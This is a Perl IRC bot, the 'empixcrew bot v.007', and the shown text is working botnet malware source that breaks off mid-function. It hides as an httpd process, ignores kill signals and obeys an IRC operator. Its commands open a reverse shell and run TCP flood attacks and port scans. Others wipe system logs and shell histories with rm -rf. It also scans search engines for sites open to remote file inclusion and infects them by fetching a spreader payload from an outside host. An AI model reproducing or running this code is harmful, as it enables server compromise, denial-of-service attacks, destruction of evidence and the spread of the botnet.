#!/usr/bin/perl

#####################################################################
##                                                                 ##
##                empixcrew bot v.007 by Fariz_coy                      ##
##                                                                 ##
#####################################################################
use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;
############################################
my $processo = '/usr/local/sbin/httpd';
######################
#####################################################################
#                         .:Fariz_coy@empixcrew:.                        #
#####################################################################
############################################
my $linas_max='3';
my $sleep='2';
my $spread="http://stul.netsolutions.cz/img/.emergency/anak.txt";
my @adms=("MaRxOeM");
my @hostauth=("sR");
my @canais=("#ImudZ");
my @nickname = ("|CPU|");
my $nick = $nickname[rand scalar @nickname];
my $ircname ='Desktop';
chop (my $realname = '7PINGG');
$servidor='irc.indoshell.org' unless $servidor;
my $porta='6667';
my $sleep='1';
my $cmd="??";
my $id="http://test.bigshop.cz/uploaded/id22.txt?";
#####################################################################
#                          .:Fariz_coy@empixcrew:.                       #
#####################################################################
$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
chdir("/");
#####################################################################
#                          .:Fariz_coy@empixcrew:.                       #
#####################################################################
#Connect
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Masalah fork: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
    print $IRC_cur_socket "$_[0]\n";
  }
}

sub conectar {
  my $meunick = $_[0];
  my $servidor_con = $_[1];
  my $porta_con = $_[2];
  my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con",
  PeerPort=>$porta_con) or return(1);
  if (defined($IRC_socket)) {
    $IRC_cur_socket = $IRC_socket;
    $IRC_socket->autoflush(1);
    $sel_cliente->add($IRC_socket);
    $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
    $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
    $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
    $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
    nick("$meunick");
    sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
    sleep 1;
  }
}

my $line_temp;
while( 1 ) {
  while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
  delete($irc_servers{''}) if (defined($irc_servers{''}));
  my @ready = $sel_cliente->can_read(0);
  next unless(@ready);
  foreach $fh (@ready) {
    $IRC_cur_socket = $fh;
    $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
    $nread = sysread($fh, $msg, 4096);
    if ($nread == 0) {
      $sel_cliente->remove($fh);
      $fh->close;
      delete($irc_servers{$fh});
    }
    @lines = split (/\n/, $msg);
    for(my $c=0; $c<= $#lines; $c++) {

      $line = $lines[$c];
      $line=$line_temp.$line if ($line_temp);
      $line_temp='';
      $line =~ s/\r$//;
      unless ($c == $#lines) {
        parse("$line");
        } else {
        if ($#lines == 0) {
          parse("$line");
          } elsif ($lines[$c] =~ /\r$/) {
          parse("$line");
          } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
          parse("$line");
          	   } else {
          	               $line_temp = $line;
        }
      }
    }
  }
}

sub parse {
  my $servarg = shift;
  if ($servarg =~ /^PING \:(.*)/) {
    sendraw("PONG :$1");
    } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
    my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
    if ($args =~ /^\001VERSION\001$/) {
      	 notice("$pn", "\001VERSION emergen�y �rew\001");
    }
    if (grep {$_ =~ /^\Q$pn\E$/i } @adms ) {
    if ($onde eq "$meunick"){
    shell("$pn", "$args");
  }

#End of Connect
#####################################################################
#                          .:Fariz_coy@empixcrew:.                       #
#####################################################################

  if ($args =~ /^(\Q$meunick\E|\!oe)\s+(.*)/ ) {
    my $natrix = $1;
    my $arg = $2;
    if ($arg =~ /^\!(.*)/) {
      ircase("$pn","$onde","$1") unless ($natrix eq "!oe" and $arg =~ /^\!nick/);
      } elsif ($arg =~ /^\@(.*)/) {
      $ondep = $onde;
      $ondep = $pn if $onde eq $meunick;
      bfunc("$ondep","$1");
      } else {
      shell("$onde", "$arg");
    }
  }
}
}

elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
if (lc($1) eq lc($meunick)) {
  $meunick=$4;
  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
}
} elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
nick("$meunick".int rand(99));
} elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
$meunick = $2;
$irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
$irc_servers{$IRC_cur_socket}{'nome'} = "$1";
foreach my $canal (@canais) {
  sendraw("JOIN $canal ddosit");
}
}
}

sub bfunc {
my $printl = $_[0];
my $funcarg = $_[1];
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
  exit;
} else {

#############################################################################################
#                                      Fariz_coy@empixcrew                                       #
#############################################################################################

if ($funcarg =~ /^help/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 pilih perintahnya...");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 !oe 7@bom");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 !oe 7@scanner");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 !oe 7@backconnect");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 !oe 7@shell");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 !oe 7@portscanner");

}

if ($funcarg =~ /^bom/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 pilihan ddos");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 tembak1, tembak2,tembak3");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 !oe 7@tembak1 <ip> <sampah> <durasi>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 !oe 7@tembak2 <ip> <port> sampah> <durasi>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 !oe 7@tembak3 <situs> <durasi>");

}

if ($funcarg =~ /^scanner/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 perintah scan...");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 perintahnya :");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 !oe 7@scan <bug> <dork>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 1POWERED by speNeds@speds ");

}

if ($funcarg =~ /^backconnect/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 jalan belakang (back konek) :");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 !oe 7@back <ip><port>");
}

if ($funcarg =~ /^shell/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 1ini perintah mangucik puki target");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 1bisa di pv ato d room");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 1klo d room ketik : 7!oe cd tmp12 contohnya");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 1bantuan perintah linux / unix :!oe 7@linuxhelp");
}

if ($funcarg =~ /^portscanner/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 perintah portscan dan a Nmap:");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 !oe 7@portscan <ip>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 12 !oe 7@nmap <ip> <beginport> <endport>");
}

#############################################################################################
#                                      Fariz_coy@empixcrew                                       #
#############################################################################################
if ($funcarg =~ /^encuk\s+(.*)/) {
$vuln = $1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :12-=4@�rew12=- 1emergen�y :1 $vuln 1�ommunity..");
my $shellurl = "http://" . $vuln . $spread . "???????";
my $reqz  = query2($shellurl);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12-=4@�rew12=- 1ternak :1 $vuln 1emergen�y �ommunity...");
}
#############################################################################################
#                                      Fariz_coy@empixcrew                                       #
#############################################################################################

if ($funcarg =~ /^system/) {
$uname=`uname -a`;$uptime=`uptime`;$ownd=`pwd`;$distro=`cat /etc/issue`;$id=`id`;$un=`uname -sro`;
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@SystemInfo6::.. 12Info BOT : 7 Servidor :Hiden : 6667");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@SystemInfo6::.. 12Uname -a     : 7 $uname");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@SystemInfo6::.. 12Uptime       : 7 $uptime");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@SystemInfo6::.. 12Own Prosses  : 7 $processo");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@SystemInfo6::.. 12ID           : 7 $id");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@SystemInfo6::.. 12Own Dir      : 7 $ownd");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@SystemInfo6::.. 12OS           : 7 $distro");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@SystemInfo6::.. 12Owner        : 7 Fariz_coy");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@SystemInfo6::.. 12Channel      : 7 #emergency");
}

#############################################################################################
#                                      Fariz_coy@empixcrew                                       #
#############################################################################################

if ($funcarg =~ /^portscan (.*)/) {
  my $hostip="$1";
  my
  @portas=("15","19","98","20","21","22","23","25","37","39","42","43","49","53","63","69","79","80","101","106","107","109","110","111","113","115","117","119","135","137","139","143","174","194","389","389","427","443","444","445","464","488","512","513","514","520","540","546","548","565","609","631","636","694","749","750","767","774","783","808","902","988","993","994","995","1005","1025","1033","1066","1079","1080","1109","1433","1434","1512","2049","2105","2432","2583","3128","3306","4321","5000","5222","5223","5269","5555","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","7001","7741","8000","8018","8080","8200","10000","19150","27374","31310","33133","33733","55555");
  my (@aberta, %porta_banner);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :12-=4@Portscan12=-12 cek port di  4".$1." 12 started .");
  foreach my $porta (@portas)  {
    my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>
    'tcp', Timeout => 4);
    if ($scansock) {
      push (@aberta, $porta);
      $scansock->close;
    }
  }

  if (@aberta) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :12-=4@Portscan12=-12 port yg terbuka: @aberta");
    } else {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :12-=4@Portscan12=-12 port terkuci rapat");
  }
}

#############################################################################################
#                                      Fariz_coy@empixcrew                                       #
#############################################################################################

   if ($funcarg =~ /^nmap\s+(.*)\s+(\d+)\s+(\d+)/){
         my $hostip="$1";
         my $portstart = "$2";
         my $portend = "$3";
         my (@abertas, %porta_banner);
       sendraw($IRC_cur_socket, "PRIVMSG $printl :12-=4@Nmap12=- 4: $1 12.:4Ports12:. 4 $2-$3");
       foreach my $porta ($portstart..$portend){
               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => $portime);
    if ($scansock) {
                 push (@abertas, $porta);
                 $scansock->close;
                 if ($xstats){
        sendraw($IRC_cur_socket, "PRIVMSG $printl :12-=4@Nmap12=- 12Founded 4 $porta"."/Open");
                 }
               }
             }
             if (@abertas) {
        sendraw($IRC_cur_socket, "PRIVMSG $printl :12-=4@Nmap12=- Complete ");
             } else {
        sendraw($IRC_cur_socket, "PRIVMSG $printl :12-=4@Nmap12=- No open ports have been founded 13");
             }
			 }
#############################################################################################
#                                      Fariz_coy@empixcrew                                       #
#############################################################################################

if ($funcarg =~ /^sapu/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12-=4@cleaner12=- 1watunya bersih bersih....");
    system 'rm -rf /var/log/lastlog';
    system 'rm -rf /var/log/wtmp';
	system 'rm -rf /etc/wtmp';
	system 'rm -rf /var/run/utmp';
	system 'rm -rf /etc/utmp';
	system 'rm -rf /var/log';
	system 'rm -rf /var/logs';
	system 'rm -rf /var/adm';
	system 'rm -rf /var/apache/log';
	system 'rm -rf /var/apache/logs';
	system 'rm -rf /usr/local/apache/log';
	system 'rm -rf /usr/local/apache/logs';
	system 'rm -rf /root/.bash_history';
	system 'rm -rf /root/.ksh_history';
sendraw($IRC_cur_socket, "PRIVMSG $printl :12-=4@cleaner12=- 1emergen�y");
		sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :12-=4@cleaner12=- 1�ommunity");
	system 'find / -name *.bash_history -exec rm -rf {} \;';
	system 'find / -name *.bash_logout -exec rm -rf {} \;';
	system 'find / -name "log*" -exec rm -rf {} \;';
	system 'find / -name *.log -exec rm -rf {} \;';
		sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :12-=4@cleaner12=- 1emergen�y �ommunity!!!");
      }
#############################################################################################
#                                      Fariz_coy@empixcrew                                       #
#############################################################################################

if ($funcarg =~ /^sendmail\s+(.*)\s+(.*)\s+(.*)\s+(.*)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@Mailer12] 1Sending Mail to :2 $3");
$subject = $1;
$sender = $2;
$recipient = $3;
@corpo = $4;
$mailtype = "content-type: text/html";
$sendmail = '/usr/sbin/sendmail';
open (SENDMAIL, "| $sendmail -t");
print SENDMAIL "$mailtype\n";
print SENDMAIL "Subject: $subject\n";
print SENDMAIL "From: $sender\n";
print SENDMAIL "To: $recipient\n\n";
print SENDMAIL "@corpo\n\n";
close (SENDMAIL);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@Mailer12] 1Mail Sended To :2 $recipient");
}
#############################################################################################
#                                      Fariz_coy@empixcrew                                       #
#############################################################################################
           if ($funcarg =~ /^join (.*)/) {
              sendraw($IRC_cur_socket, "JOIN ".$1);
           }
           if ($funcarg =~ /^part (.*)/) {
              sendraw($IRC_cur_socket, "PART ".$1);
           }
           if ($funcarg =~ /^nick (.*)/) {
              sendraw($IRC_cur_socket, "NICK ".$1);
           }

#############################################################################################
#                                      Fariz_coy@empixcrew                                       #
#############################################################################################

if ($funcarg =~ /^tembak2\s+(.*)\s+(\d+)\s+(\d+)/) {
  sendraw($IRC_cur_socket, "PRIVMSG $printl :12-=4@SNIPPER12=- 1TEMBAAAAAAK 4 ".$1.":".$2." 12selama 4 ".$3." 12seconds.");
  my $itime = time;
  my ($cur_time);
  $cur_time = time - $itime;
  while ($3>$cur_time){
  $cur_time = time - $itime;
  &tcpflooder("$1","$2","$3");
}
sendraw($IRC_cur_socket,"PRIVMSG $printl :12-=4@SNIPPER12=- 1MODYARRR MUSUHE 4 ".$1.":".$2.".");
}
#############################################################################################
#                                      Fariz_coy@empixcrew                                       #
#############################################################################################
if ($funcarg =~ /^back\s+(.*)\s+(\d+)/) {
my $host = "$1";
my $porta = "$2";
my $proto = getprotobyname('tcp');
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($porta, $iaddr);
my $shell = "/bin/sh -i";
if ($^O eq "MSWin32") {
  $shell = "cmd.exe";
}
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
connect(SOCKET, $paddr) or die "connect: $!";
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system("$shell");
close(STDIN);
close(STDOUT);
close(STDERR);
if ($estatisticas)
{
  sendraw($IRC_cur_socket, "PRIVMSG $printl :12-=4@BackConnect12=- 1masuk ke 4 $host:$porta");
}
}
#############################################################################################
#                                      Fariz_coy@empixcrew                                       #
#############################################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
### Start Message
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 14emergen04�14y 04 �14rew 6..::4@KAmpUngAN6::..");
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4Di Mulai 10$dork 6..::4@KAmpUngAN6::..");
### End of Start Message
# Starting The Search Engine
	my @google=&googlet($dork);
#
push(my @tot, @google);
#
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 1Total:9 ".scalar(@tot)." 6TEMPIK:9 ".scalar(@puliti)."6..::4@KAmpUngAN6::..");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9GOOGLE 1Finish 4$dork 6..::4@KAmpUngAN6::..");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /31337/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9Vuln 4OFF: 10$print10 6..::4@KAmpUngAN6::..");
  sendraw($IRC_cur_socket, "PRIVMSG Fariz_coy :6..::4@KAmpUngAN6::.. 4@9Vuln 4OFF: 10$print10 6..::4@KAmpUngAN6::..");
  sendraw($IRC_cur_socket, "PRIVMSG Oops :6..::4@KAmpUngAN6::.. 4@9Vuln 4OFF: 10$print10 6..::4@KAmpUngAN6::..");
my $test2="http://".$sito.$bug.$spread."???????";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
elsif($re =~ /31337/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9Vuln 4ON: 10$print10 6..::4@KAmpUngAN6::..");
  sendraw($IRC_cur_socket, "PRIVMSG Fariz_coy :6..::4@KAmpUngAN6::.. 4@9Vuln 4ON: 10$print10 6..::4@KAmpUngAN6::..");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### AllTheWeb
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @alltheweb=&allthewebt($dork);
	my @allweb=&standard($dork);
#
push(my @tot, @alltheweb, @allweb);
#
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 1Total:9 ".scalar(@tot)." 6TEMPIK:9 ".scalar(@puliti)."6..::4@KAmpUngAN6::..");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9ALLTHEWEB 1Finish 4$dork 6..::4@KAmpUngAN6::..");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /31337/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
 sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9Vuln 4OFF: 10$print10 6..::4@KAmpUngAN6::..");
  sendraw($IRC_cur_socket, "PRIVMSG Fariz_coy :6..::4@KAmpUngAN6::.. 4@9Vuln 4OFF: 10$print10 6..::4@KAmpUngAN6::..");
  sendraw($IRC_cur_socket, "PRIVMSG Oops :6..::4@KAmpUngAN6::.. 4@9Vuln 4OFF: 10$print10 6..::4@KAmpUngAN6::..");
my $test2="http://".$sito.$bug.$spread."???????";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
elsif($re =~ /31337/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9Vuln 4SILIT: 10$print10 6..::4@KAmpUngAN6::..");
  sendraw($IRC_cur_socket, "PRIVMSG Fariz_coy :6..::4@KAmpUngAN6::.. 4@9Vuln 4SILIT: 10$print10 6..::4@KAmpUngAN6::..");
  my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### AOL
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @aollist=&aol($dork);
	my @aollista=&aola($dork);
	my @aollistb=&aolb($dork);
	my @aollistc=&aolc($dork);
push(my @aolbyp,@aollist, @aollista, @aollistb, @aollistc );
#
push(my @tot, @aolbyp);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 1Total:9 ".scalar(@tot)." 6TEMPIK:9 ".scalar(@puliti)."6..::4@KAmpUngAN6::..");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9AOL 1Finish 4$dork 6..::4@KAmpUngAN6::..");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /31337/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
 sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9Vuln 4OFF: 10$print10 6..::4@KAmpUngAN6::..");
  sendraw($IRC_cur_socket, "PRIVMSG Fariz_coy :6..::4@KAmpUngAN6::.. 4@9Vuln 4OFF: 10$print10 6..::4@KAmpUngAN6::..");
  sendraw($IRC_cur_socket, "PRIVMSG Oops :6..::4@KAmpUngAN6::.. 4@9Vuln 4OFF: 10$print10 6..::4@KAmpUngAN6::..");
my $test2="http://".$sito.$bug.$spread."???????";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
elsif($re =~ /31337/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
 sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9Vuln 4ON: 10$print10 6..::4@KAmpUngAN6::..");
 sendraw($IRC_cur_socket, "PRIVMSG Fariz_coy :6..::4@KAmpUngAN6::.. 4@9Vuln 4ON: 10$print10 6..::4@KAmpUngAN6::..");
  my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### Yahoo
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @ylist=&yahoo($dork);
	my @yalist=&yahooa($dork);
	my @yblist=&yahoob($dork);
	my @yclist=&yahooc($dork);
	my @ydlist=&yahood($dork);
		push(my @yahoobypass, @ylist, @yalist, @yblist, @yclist, @ydlist );
#
push(my @tot, @yahoobypass);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 1Total:9 ".scalar(@tot)." 6TEMPIK:9 ".scalar(@puliti)."6..::4@KAmpUngAN6::..");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9YAHOO 1Finish 4$dork 6..::4@KAmpUngAN6::..");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /31337/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9Vuln 4OFF: 10$print10 6..::4@KAmpUngAN6::..");
  sendraw($IRC_cur_socket, "PRIVMSG Fariz_coy :6..::4@KAmpUngAN6::.. 4@9Vuln 4OFF: 10$print10 6..::4@KAmpUngAN6::..");
  sendraw($IRC_cur_socket, "PRIVMSG Oops :6..::4@KAmpUngAN6::.. 4@9Vuln 4OFF: 10$print10 6..::4@KAmpUngAN6::..");
my $test2="http://".$sito.$bug.$spread."???????";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
elsif($re =~ /31337/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9Vuln 4ON: 10$print10 6..::4@KAmpUngAN6::..");
  sendraw($IRC_cur_socket, "PRIVMSG Fariz_coy :6..::4@KAmpUngAN6::.. 4@9Vuln 4ON: 10$print10 6..::4@KAmpUngAN6::..");
  my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### MSN
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @mlist=&msn($dork);
push(my @tot, @mlist);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 1Total:9 ".scalar(@tot)." 6TEMPIK:9 ".scalar(@puliti)."6..::4@KAmpUngAN6::..");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9MSN 1Finish 4$dork 6..::4@KAmpUngAN6::..");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /31337/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :6..::4@KAmpUngAN6::.. 4@9Vuln 4OFF: 10$print10 6..::4@KAmpUngAN6::..");
  sendraw($IRC_cur_socket, "PRIVMSG Fariz_coy :6..::4@KAmpUngAN6::.. 4@9Vuln 4OFF: 10$print10 6..::4@KAmpUngAN6::..");
